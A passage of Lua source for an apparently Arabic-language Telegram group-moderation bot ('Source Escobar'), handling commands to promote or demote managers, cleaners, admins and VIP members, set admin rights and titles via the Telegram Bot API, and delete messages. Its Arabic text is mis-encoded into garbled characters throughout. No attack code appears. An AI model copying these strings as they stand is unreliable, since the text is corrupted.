ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΩΩΩ° ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΪΩΰ’ͺΨ’Ϋ½*")  
end  
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^Ψ±ΩΨΉ ΩΨ―ΩΨ± @(.*)') and ChCheck(msg) then
local username = text:match('^Ψ±ΩΨΉ ΩΨ―ΩΨ± @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:sadd(mustafa..'mfm:Managers:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΩΩΩ° ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΪΩΰ’ͺΨ’Ϋ½*")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')
end end 
resolve_username(username,promreply)
end 
if text and text:match('^Ψ±ΩΨΉ ΩΨ―ΩΨ± (%d+)') and ChCheck(msg) then
local user = text:match('Ψ±ΩΨΉ ΩΨ―ΩΨ± (%d+)')
Devmfm:sadd(mustafa..'mfm:Managers:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΩΩΩ° ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΪΩΰ’ͺΨ’Ϋ½*")  
end
--     Source Escobar     --
--       Rem Manager      --
if text ==('ΨͺΩΨ²ΩΩ ΩΨ―ΩΨ±') and ChCheck(msg) then
function prom_reply(extra, result, success)
Devmfm:srem(mustafa..'mfm:Managers:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΪΩΰ’ͺΨ’Ϋ½*")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^ΨͺΩΨ²ΩΩ ΩΨ―ΩΨ± @(.*)') and ChCheck(msg) then
local username = text:match('^ΨͺΩΨ²ΩΩ ΩΨ―ΩΨ± @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:srem(mustafa..'mfm:Managers:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΪΩΰ’ͺΨ’Ϋ½*")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ΨͺΩΨ²ΩΩ ΩΨ―ΩΨ± (%d+)') and ChCheck(msg) then
local user = text:match('ΨͺΩΨ²ΩΩ ΩΨ―ΩΨ± (%d+)')
Devmfm:srem(mustafa..'mfm:Managers:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΪΩΰ’ͺΨ’Ϋ½*")  
end 
--     Source Escobar     --
--       Set Cleaner      --
if text ==('Ψ±ΩΨΉ ΩΩΨΈΩ') and ChCheck(msg) then
function prom_reply(extra, result, success)
Devmfm:sadd(mustafa..'mfm:Cleaner:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΩΩΩ° ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ§ΩΩΩΨΈΩΩΩΩ°Ω*")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^Ψ±ΩΨΉ ΩΩΨΈΩ @(.*)') and ChCheck(msg) then
local username = text:match('^Ψ±ΩΨΉ ΩΩΨΈΩ @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:sadd(mustafa..'mfm:Cleaner:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΩΩΩ° ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ§ΩΩΩΨΈΩΩΩΩ°Ω*")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^Ψ±ΩΨΉ ΩΩΨΈΩ (%d+)') and ChCheck(msg) then
local user = text:match('Ψ±ΩΨΉ ΩΩΨΈΩ (%d+)')
Devmfm:sadd(mustafa..'mfm:Cleaner:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΩΩΩ° ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ§ΩΩΩΨΈΩΩΩΩ°Ω*")  
end
--     Source Escobar     --
--       Rem Cleaner      --
if text ==('ΨͺΩΨ²ΩΩ ΩΩΨΈΩ') and ChCheck(msg) then
function prom_reply(extra, result, success)
Devmfm:srem(mustafa..'mfm:Cleaner:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ§ΩΩΩΨΈΩΩΩΩ°Ω*")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^ΨͺΩΨ²ΩΩ ΩΩΨΈΩ @(.*)') and ChCheck(msg) then
local username = text:match('^ΨͺΩΨ²ΩΩ ΩΩΨΈΩ @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:srem(mustafa..'mfm:Cleaner:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ§ΩΩΩΨΈΩΩΩΩ°Ω*")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ΨͺΩΨ²ΩΩ ΩΩΨΈΩ (%d+)') and ChCheck(msg) then
local user = text:match('ΨͺΩΨ²ΩΩ ΩΩΨΈΩ (%d+)')
Devmfm:srem(mustafa..'mfm:Cleaner:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ§ΩΩΩΨΈΩΩΩΩ°Ω*")  
end end
--     Source Escobar     --
--       Set admin        --
if Manager(msg) then
if text ==('Ψ±ΩΨΉ Ψ§Ψ―ΩΩ') and ChCheck(msg) then
function prom_reply(extra, result, success)
if not BasicConstructor(msg) and Devmfm:get(mustafa.."mfm:Lock:ProSet"..msg.chat_id_) then 
Dev_mfm(msg.chat_id_, msg.id_, 1,'β β« ΩΨ§ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ±ΩΨΉ Ψ§Ψ­Ψ― ΩΨ°Ψ§ΩΩ Ψ¨Ψ³Ψ¨Ψ¨ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±ΩΨΉ ΩΩ ΩΨ¨Ω Ψ’ΩΩΩΩΨ΄ΩΨ¦ΩΩ°Ω', 1, 'md')
return false
end
Devmfm:sadd(mustafa..'mfm:Admins:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΩΩΩ° ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΨ’ΪΩΩΩΩΩΫ*")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^Ψ±ΩΨΉ Ψ§Ψ―ΩΩ @(.*)') and ChCheck(msg) then
local username = text:match('^Ψ±ΩΨΉ Ψ§Ψ―ΩΩ @(.*)')
function promreply(extra,result,success)
if not BasicConstructor(msg) and Devmfm:get(mustafa.."mfm:Lock:ProSet"..msg.chat_id_) then 
Dev_mfm(msg.chat_id_, msg.id_, 1,'β β« ΩΨ§ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ±ΩΨΉ Ψ§Ψ­Ψ― ΩΨ°Ψ§ΩΩ Ψ¨Ψ³Ψ¨Ψ¨ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±ΩΨΉ ΩΩ ΩΨ¨Ω Ψ’ΩΩΩΩΨ΄ΩΨ¦ΩΩ°Ω', 1, 'md')
return false
end
if result.id_ then
Devmfm:sadd(mustafa..'mfm:Admins:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΩΩΩ° ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΨ’ΪΩΩΩΩΩΫ*")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^Ψ±ΩΨΉ Ψ§Ψ―ΩΩ (%d+)') and ChCheck(msg) then
local user = text:match('Ψ±ΩΨΉ Ψ§Ψ―ΩΩ (%d+)')
if not BasicConstructor(msg) and Devmfm:get(mustafa.."mfm:Lock:ProSet"..msg.chat_id_) then 
Dev_mfm(msg.chat_id_, msg.id_, 1,'β β« ΩΨ§ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ±ΩΨΉ Ψ§Ψ­Ψ― ΩΨ°Ψ§ΩΩ Ψ¨Ψ³Ψ¨Ψ¨ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±ΩΨΉ ΩΩ ΩΨ¨Ω Ψ’ΩΩΩΩΨ΄ΩΨ¦ΩΩ°Ω', 1, 'md')
return false
end
Devmfm:sadd(mustafa..'mfm:Admins:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΩΩΩ° ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΨ’ΪΩΩΩΩΩΫ*")  
end
--     Source Escobar     --
--        Rem admin       --
if text ==('ΨͺΩΨ²ΩΩ Ψ§Ψ―ΩΩ') and ChCheck(msg) then
function prom_reply(extra, result, success)
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΨ’ΪΩΩΩΩΩΫ*")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^ΨͺΩΨ²ΩΩ Ψ§Ψ―ΩΩ @(.*)') and ChCheck(msg) then
local username = text:match('^ΨͺΩΨ²ΩΩ Ψ§Ψ―ΩΩ @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΨ’ΪΩΩΩΩΩΫ*")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ΨͺΩΨ²ΩΩ Ψ§Ψ―ΩΩ (%d+)') and ChCheck(msg) then
local user = text:match('ΨͺΩΨ²ΩΩ Ψ§Ψ―ΩΩ (%d+)')
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΨ’ΪΩΩΩΩΩΫ*")  
end end
--     Source Escobar     --
--       Set Vipmem       --
if Admin(msg) then
if text ==('Ψ±ΩΨΉ ΩΩΩΨ²') and ChCheck(msg) then
function prom_reply(extra, result, success)
if not BasicConstructor(msg) and Devmfm:get(mustafa.."mfm:Lock:ProSet"..msg.chat_id_) then 
Dev_mfm(msg.chat_id_, msg.id_, 1,'β β« ΩΨ§ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ±ΩΨΉ Ψ§Ψ­Ψ― ΩΨ°Ψ§ΩΩ Ψ¨Ψ³Ψ¨Ψ¨ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±ΩΨΉ ΩΩ ΩΨ¨Ω Ψ’ΩΩΩΩΨ΄ΩΨ¦ΩΩ°Ω', 1, 'md')
return false
end
Devmfm:sadd(mustafa..'mfm:VipMem:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΩΩΩ° ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΩΩΩ°Ψ²ΩΩ*")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^Ψ±ΩΨΉ ΩΩΩΨ² @(.*)') and ChCheck(msg) then
local username = text:match('^Ψ±ΩΨΉ ΩΩΩΨ² @(.*)')
function promreply(extra,result,success)
if not BasicConstructor(msg) and Devmfm:get(mustafa.."mfm:Lock:ProSet"..msg.chat_id_) then 
Dev_mfm(msg.chat_id_, msg.id_, 1,'β β« ΩΨ§ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ±ΩΨΉ Ψ§Ψ­Ψ― ΩΨ°Ψ§ΩΩ Ψ¨Ψ³Ψ¨Ψ¨ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±ΩΨΉ ΩΩ ΩΨ¨Ω Ψ’ΩΩΩΩΨ΄ΩΨ¦ΩΩ°Ω', 1, 'md')
return false
end
if result.id_ then
Devmfm:sadd(mustafa..'mfm:VipMem:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΩΩΩ° ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΩΩΩ°Ψ²ΩΩ*")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^Ψ±ΩΨΉ ΩΩΩΨ² (%d+)') and ChCheck(msg) then
local user = text:match('Ψ±ΩΨΉ ΩΩΩΨ² (%d+)')
if not BasicConstructor(msg) and Devmfm:get(mustafa.."mfm:Lock:ProSet"..msg.chat_id_) then 
Dev_mfm(msg.chat_id_, msg.id_, 1,'β β« ΩΨ§ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ±ΩΨΉ Ψ§Ψ­Ψ― ΩΨ°Ψ§ΩΩ Ψ¨Ψ³Ψ¨Ψ¨ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±ΩΨΉ ΩΩ ΩΨ¨Ω Ψ’ΩΩΩΩΨ΄ΩΨ¦ΩΩ°Ω', 1, 'md')
return false
end
Devmfm:sadd(mustafa..'mfm:VipMem:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΩΩΩ° ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΩΩΩ°Ψ²ΩΩ*")  
end
--     Source Escobar     --
--       Rem Vipmem       --
if text ==('ΨͺΩΨ²ΩΩ ΩΩΩΨ²') and ChCheck(msg) then
function prom_reply(extra, result, success)
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΩΩΩ°Ψ²ΩΩ*")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^ΨͺΩΨ²ΩΩ ΩΩΩΨ² @(.*)') and ChCheck(msg) then
local username = text:match('^ΨͺΩΨ²ΩΩ ΩΩΩΨ² @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΩΩΩ°Ψ²ΩΩ*")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ΨͺΩΨ²ΩΩ ΩΩΩΨ² (%d+)') and ChCheck(msg) then
local user = text:match('ΨͺΩΨ²ΩΩ ΩΩΩΨ² (%d+)')
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΩΩΩ°Ψ²ΩΩ*")  
end end 
--     Source Escobar     --
if BasicConstructor(msg) then
if text and text:match("^Ψ±ΩΨΉ ΩΨ΄Ψ±Ω$") and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..mustafa)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΩΨ΄ΩΩΰ’ͺΩ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*")  
else
Dev_mfm(msg.chat_id_, msg.id_, 1,'β β« ΩΩΨ³Ψͺ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© Ψ§ΨΆΨ§ΩΨ© ΩΨ΄Ψ±ΩΩΩΩ°Ω Ψ¬Ψ―Ψ― ΩΨ±Ψ¬Ω Ψ§ΩΨͺΨ­ΩΩ ΩΩ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΨ΄Ψ±Ω$") and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..mustafa)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩ ΩΨ΄Ψ±ΩΩΩΩ°Ω Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*")  
else
Dev_mfm(msg.chat_id_, msg.id_, 1,'β β« ΩΩΨ³Ψͺ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© Ψ§ΨΆΨ§ΩΨ© ΩΨ΄Ψ±ΩΩΩΩ°Ω Ψ¬Ψ―Ψ― ΩΨ±Ψ¬Ω Ψ§ΩΨͺΨ­ΩΩ ΩΩ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end 
if text and (text:match("^Ψ±ΩΨΉ Ψ¨ΩΩ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ$") or text:match("^Ψ±ΩΨΉ Ψ¨ΩΩ Ψ΅ΩΨ§Ψ­ΩΨ§Ψͺ$")) and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..mustafa)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΨ΄Ψ±Ω ΩΩΩΩ° Ψ¬ΩΩΨΉ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ*")  
else
Dev_mfm(msg.chat_id_, msg.id_, 1,'β β« ΩΩΨ³Ψͺ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© Ψ§ΨΆΨ§ΩΨ© ΩΨ΄Ψ±ΩΩΩΩ°Ω Ψ¬Ψ―Ψ― ΩΨ±Ψ¬Ω Ψ§ΩΨͺΨ­ΩΩ ΩΩ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and (text:match("^ΩΨΆΨΉ ΩΩΨ¨ (.*)$") or text:match("^Ψ±ΩΨΉ ΩΨ΄Ψ±Ω (.*)$") or text:match("^ΨΆΨΉ ΩΩΨ¨ (.*)$")) and ChCheck(msg) then
local mfm = text:match("^ΩΨΆΨΉ ΩΩΨ¨ (.*)$") or text:match("^Ψ±ΩΨΉ ΩΨ΄Ψ±Ω (.*)$") or text:match("^ΨΆΨΉ ΩΩΨ¨ (.*)$")
function ReplySet(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..mustafa)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
https.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ Ψ§ΨΆΨ§ΩΨ© β * "..mfm.."* ΩΩΩΨ¨ ΩΩ*")  
https.request("https://api.telegram.org/bot"..TokenBot.."/setChatAdministratorCustomTitle?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&custom_title="..mfm)
else
Dev_mfm(msg.chat_id_, msg.id_, 1,'β β« ΩΩΨ³Ψͺ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© Ψ§ΨΆΨ§ΩΨ© ΩΨ΄Ψ±ΩΩΩΩ°Ω Ψ¬Ψ―Ψ― ΩΨ±Ψ¬Ω Ψ§ΩΨͺΨ­ΩΩ ΩΩ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ', 1, 'md')
end
end
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ReplySet)
end
end
end
--     Source Escobar     --
if text == "Ψ΅ΩΨ§Ψ­ΩΨͺΩ" or text == "Ψ΅ΩΨ§Ψ­ΩΨ§ΨͺΩ" and ChCheck(msg) then 
if tonumber(msg.reply_to_message_id_) == 0 then 
Validity(msg,msg.sender_user_id_)
end end
if text ==('Ψ΅ΩΨ§Ψ­ΩΨͺΩ') or text ==('Ψ΅ΩΨ§Ψ­ΩΨ§ΨͺΩ') and ChCheck(msg) then
function ValidityReply(extra, result, success)
Validity(msg,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ValidityReply)
end end
if text and (text:match('^Ψ΅ΩΨ§Ψ­ΩΨͺΩ @(.*)') or text:match('^Ψ΅ΩΨ§Ψ­ΩΨ§ΨͺΩ @(.*)')) and ChCheck(msg) then
local username = text:match('^Ψ΅ΩΨ§Ψ­ΩΨͺΩ @(.*)') or text:match('^Ψ΅ΩΨ§Ψ­ΩΨ§ΨͺΩ @(.*)')
function ValidityUser(extra,result,success)
if result.id_ then
Validity(msg,result.id_) 
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')
end end 
resolve_username(username,ValidityUser)
end
if text and (text:match('^Ψ΅ΩΨ§Ψ­ΩΨͺΩ (%d+)') or text:match('^Ψ΅ΩΨ§Ψ­ΩΨ§ΨͺΩ (%d+)')) and ChCheck(msg) then
local ValidityId = text:match('Ψ΅ΩΨ§Ψ­ΩΨͺΩ (%d+)') or text:match('Ψ΅ΩΨ§Ψ­ΩΨ§ΨͺΩ (%d+)')
Validity(msg,ValidityId)  
end
--     Source Escobar     --
if Admin(msg) then
if msg.reply_to_message_id_ ~= 0 then
if text and (text:match("^ΩΨ³Ψ­$") or text:match("^Ψ­Ψ°Ω$")) and ChCheck(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.reply_to_message_id_})
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ­Ψ°Ω Ψ§ΩΨ±Ψ³Ψ§ΩΩ ΩΨΉ Ψ±Ψ³Ψ§ΩΨ© Ψ§ΩΨ§ΩΨ±', 1, 'md')
end end end
--     Source Escobar     --
if Constructor(msg) then
if text == "ΨͺΩΨΉΩΩ Ψ§ΩΨ­ΨΈΨ±" and ChCheck(msg) or text == "ΨͺΩΨΉΩΩ Ψ§ΩΨ·Ψ±Ψ―" and ChCheck(msg) then
Devmfm:del(mustafa.."mfm:Lock:KickBan"..msg.chat_id_)
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ·Ψ±Ψ― ΩΨ§ΩΨ­ΨΈΨ±'
